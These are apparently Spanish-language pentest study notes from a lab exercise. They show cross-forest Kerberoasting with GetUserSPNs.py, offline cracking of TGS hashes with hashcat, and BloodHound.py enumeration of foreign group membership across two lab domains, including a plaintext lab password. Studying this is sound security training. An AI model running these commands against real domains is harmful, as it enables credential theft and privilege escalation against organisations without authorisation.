
Podemos hacer el Kerberoast usando GetUserSPNs.py desde Linux hacia un bosque de confianza externo

1. Usamos GetUserSPNs.py para ver usuarios con SPN

```
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
![[Pasted image 20261005190616.png]]


2. Pedimos el ticket TGS usando GetUserSPNs.py

```
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
![[Pasted image 20261005190705.png]]

3. Luego podriamos crackearlo offline

```
hashcat -m 13100 hash /WORDLIST
```

Si tenemos existo nos podremos autenticar en FREIGHTLOGISTICS.LOCAL como Domain Admin

También valdría la pena comprobar si esta cuenta existe en nuestro dominio actual y si sufre de reutilización de contraseñas


## Búsqueda de pertenencia a grupos externos con Bloodhound-python

Podemos ver usuarios o admins de un dominio distinto como miembros de grupos de nuestro dominio

Solo los Grupos Locales de Dominio o Domain Local Groups pemriten usuarios de fuera de su bosque. No es raro ver a un usuario con privs elevados en DOMINIO A como miembro del grupo de admins incorporado en el DOMINIO B en una confianza bidireccional

Usando [implementación en Python de BloodHound](https://github.com/fox-it/BloodHound.py) podriamos recopilar info de multiples dominios y cargarlos en GUI para buscar relaciones

En algunas evaluaciones, nuestro cliente puede aprovisionarnos una VM que obtiene una IP de DHCP y está configurada para usar el DNS del dominio interno. En otras ocasiones, estaremos en un host de ataque sin el DNS configurado. En este caso, necesitaríamos editar nuestro archivo `resolv.conf`


1. Conf resolv.cong añadiendo el dominio INLANEFREIGHT.LOCAL

```
cat /etc/resolv.conf
```
![[Pasted image 20261005191256.png]]

2. Ejecutamos la herramienta de bloodhound.py contra ese dominio

```
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```
![[Pasted image 20261005191330.png]]

3. Comprimos los archivos para subir luego solo un archivo zip del dominio

```
zip -r ilfreight_bh.zip *.json
```
![[Pasted image 20261005191405.png]]

4. Añadimos el segundo dominio a resolv.conf FREGHTLOGISTICS.LOCAL

```
cat /etc/resolv.conf
```
![[Pasted image 20261005191439.png]]

5. Ejecutamos la herramienta de bloodhound.py contra ese dominio

```
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```
![[Pasted image 20261005191459.png]]

6. Comprimos los archivos para subir luego solo un archivo zip del dominio

```
zip -r freightlog_bh.zip *.json
```


7. Subimos los os archivos y vamos a Analisys > Users with Foreign Domain Group Membership para ver usuarios que no pertenecen al dominio siendo parte de ese dominio

![[Pasted image 20261005191606.png]]
